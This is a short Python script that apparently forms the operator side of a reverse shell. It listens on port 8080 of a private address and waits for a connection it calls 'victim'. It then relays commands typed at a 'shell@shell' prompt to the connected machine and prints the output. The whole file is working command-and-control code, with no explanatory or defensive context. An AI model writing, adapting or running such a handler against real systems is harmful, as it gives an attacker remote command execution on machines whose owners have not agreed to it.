import socket

server = socket.socket()
server.bind(('192.168.1.65', 8080))
server.listen(1)

while True:
    victim, address = server.accept()
    print('Conexion de: {}'.format(address))
    binary_msg = victim.recv(1024)
    decoded_msg = binary_msg.decode('ascii')

    if decoded_msg == '1':
        while True:
            option = input('shell@shell: ')
            victim.send(option.encode('ascii'))
            result = victim.recv(2048)
            print(result.decode('utf-8'))
    else:
        print('Error')
        break
